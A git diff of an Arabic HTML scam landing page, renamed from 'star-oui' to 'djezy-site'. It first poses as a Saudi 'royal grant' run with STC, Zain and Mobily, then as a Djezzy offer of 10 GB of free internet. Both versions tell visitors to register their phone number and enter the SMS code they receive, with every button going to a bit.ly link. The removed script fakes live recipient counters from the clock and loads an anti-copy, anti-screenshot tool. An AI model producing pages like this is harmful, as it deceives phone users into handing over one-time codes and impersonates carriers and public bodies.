@@ -9,98 +9,75 @@
       integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
       crossorigin="anonymous"
     />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap"
+      rel="stylesheet"
+    />
     <link rel="stylesheet" href="style.css" />
-    <title>star-oui</title>
+    <title>djezy-site</title>
   </head>
   <body>
-    <div class="home text-center bg-dark text-light sm-d-block">
-      <div
-        class="row mx-0 justify-content-lg-between align-items-lg-center"
-        style="min-height: 100vh"
-      >
-        <div class="col-lg-6 col-sm-12 mb-1 px-0">
-          <div class="image">
-            <img class="w-100" src="./img/bg.jpeg" alt="" />
-          </div>
-        </div>
-        <div class="col-lg-6 col-sm-12" style="margin-top: -75px">
+    <div class="home">
+      <div class="col-lg-12 col-sm-6">
+        <img src="./img/bg.jpeg" alt="" class="w-100" />
+      </div>
+      <div class="col-lg-12 col-sm-6">
+        <div class="content">
           <div class="container">
             <div class="informations fs-4 fw-bold">
               <div class="content">
                 <h3
-                  class="border-success pb-2 mx-auto mt-2"
-                  style="border-bottom: 4px solid; width: 290px"
+                  class="pb-2 mx-auto mt-2 fs-5"
+                  style="width: fit-content"
+                  dir="rtl"
                 >
-                  لتسهيل توزيع المكرمة الملكية
+                  يمكنك تشغيل العرض عبر الطرق التالية :
                 </h3>
-                <ul dir="rtl" class="pe-3 ps-0">
+                <ol dir="rtl" class="pe-3 ps-0">
+                  <li class="mt-1">قم بتسجيل رقم هاتفك</li>
+                  <li class="mt-1">بعد التسجيل برقم الهاتف في الموقع</li>
+                  <li class="mt-1">سوف تتلقي كود تفعيل العرض في رسالة</li>
+                  <li class="mt-1">ادخل هذا الكود في الموقع</li>
                   <li class="mt-1">
-                    قمنا بالتنسيق مع شركات الاتصالات في المملكة
+                    وسيتم الحصول على العرض خلال ساعتين من التسجيل
                   </li>
-                  <li class="mt-1">عن طريق التسجيل برقم الجوال</li>
-                  <li class="mt-1">وسيصلك رسالة نصية بها رمز التحقق</li>
-                  <li class="mt-1">قم بأدخال هذا الرمز في الموقع</li>
-                  <li class="mt-1">
-                    ثم تصلك رسالة من مكتب البريد لتحديد موعد الاستلام
-                  </li>
-                </ul>
+                </ol>
               </div>
             </div>
-            <div class="btns mb-1">
-              <div class="row">
-                <div class="btn-gazy col-lg-4 col-sm-12">
-                  <a
-                    href="https://bit.ly/3Icd15i"
-                    class="btn text-light w-100 rounded-5 fs-5 mt-2 fw-bold"
-                    style="background-color: #7f00ff"
-                    >لعملاء اس تي سـي اضغط هنا</a
-                  >
-                </div>
-                <div class="btn-mobils col-lg-4 col-sm-12">
-                  <a
-                    href="https://bit.ly/3Icd15i"
-                    class="btn text-light w-100 rounded-5 fs-5 mt-2 fw-bold btn-success"
-                    >لعملاء زيـن اضغط هنا</a
-                  >
-                </div>
-                <div class="btn-orido col-lg-4 col-sm-12">
-                  <a
-                    href="https://bit.ly/3Icd15i"
-                    class="btn text-light w-100 rounded-5 fs-5 mt-2 fw-bold"
-                    style="background-color: #0288d1"
-                    >لعملاء موبايلـي اضغط هنا</a
-                  >
-                </div>
+            <div class="btns mb-1 w-100">
+              <div
+                class="btn-gazy w-100 mb-2"
+                style="font-family: 'Cairo', sans-serif"
+              >
+                <a
+                  href="https://bit.ly/3Icd15i"
+                  class="btn text-light d-flex align-items-center justify-content-center fs-1 fw-bold"
+                  style="background-color: red"
+                >
+                  <span class="text-end">
+                    <span class="giga fs-3 text-end">جيجا</span>
+                    <span class="fs-3">انترنت</span>
+                  </span>
+                  <span class="fs-3 ms-3">10</span>
+                </a>
               </div>
-            </div>
-            <div
-              class="footer d-flex justify-content-center align-items-center"
-            >
-              <div class="row">
-                <div class="col-4">
-                  <div class="num" id="calc">
-                    <h3 class="mb-0">26095</h3>
-                  </div>
-                  <div class="text">
-                    <span>اجمالي عدد الحاصلين</span>
-                  </div>
-                </div>
-                <div class="col-4">
-                  <div class="num" id="winY">
-                    <h3 class="mb-0">18739</h3>
-                  </div>
-                  <div class="text">
-                    <span>الحاصلين امس </span>
-                  </div>
-                </div>
-                <div class="col-4">
-                  <div class="num" id="winDay">
-                    <h3 class="mb-0">7561</h3>
-                  </div>
-                  <div class="text">
-                    <span>الحاصلين اليوم </span>
-                  </div>
-                </div>
+              <div
+                class="btn-gazy w-100"
+                style="font-family: 'Cairo', sans-serif"
+              >
+                <a
+                  href="https://bit.ly/3Icd15i"
+                  class="btn text-light d-flex align-items-center justify-content-center fs-1 fw-bold"
+                  style="background-color: red"
+                >
+                  <span class="text-end">
+                    <span class="giga fs-3 text-end">جيجا</span>
+                    <span class="fs-3">انترنت</span>
+                  </span>
+                  <span class="fs-3 ms-3">10</span>
+                </a>
               </div>
             </div>
           </div>
@@ -116,34 +93,6 @@
       src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
       integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+"
       crossorigin="anonymous"
-    ></script>
-    <script>
-      let fNum = String(Date.now()).slice(4, 9);
-      const winDay = document.querySelector("#winDay h3");
-      const calc = document.querySelector("#calc h3");
-      const winY = document.querySelector("#winY h3");
-      winDay.innerHTML = fNum;
-      calc.innerHTML = +winDay.innerHTML + +winY.innerHTML;
-      setInterval(() => {
-        if (fNum[0] == 0) {
-          fNum[0] = 1;
-        }
-        winDay.innerHTML = String(Date.now()).slice(4, 9);
-        calc.innerHTML = +winDay.innerHTML + +winY.innerHTML;
-      }, 1000);
-      setInterval(() => {
-        winY.innerHTML = String(Date.now()).slice(5, 10);
-      }, 1000 * 60 * 60 * 24);
-    </script>
-        <script>
-      var noPrint = true;
-      var noCopy = true;
-      var noScreenshot = true;
-      var autoBlur = true;
-    </script>
-    <script
-      type="text/javascript"
-      src="https://pdfanticopy.com/noprint.js"
     ></script>
   </body>
 </html>
